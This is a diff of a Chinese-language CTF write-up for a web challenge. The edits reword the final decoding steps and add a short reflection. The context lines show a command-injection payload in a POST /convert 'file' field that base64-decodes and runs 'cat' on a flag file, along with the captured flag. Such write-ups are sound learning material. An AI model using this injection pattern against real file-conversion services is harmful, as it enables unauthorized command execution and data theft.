@@ -106,9 +106,9 @@ end
     POST /convert
     file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png
 
-7. 响应是一段 JS，里面的 data:image/png;base64, 后面那串就是文件内容被 base64 之后的结果，解码即可
+7. 响应是一段 JS，里面的 data:image/png;base64, 后面那串就是文件内容被 base64 之后的结果。
 
-8. 获得flag
+8. 解码获得flag
 
 ### Payload
 
@@ -119,3 +119,5 @@ file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png
 ctfhub{495402a295e64e154691dcdf}
 
 ### 总结&反思
+
+本次我首次见到.rb文件，也让我对网页侵入的流程有了最初的认识。
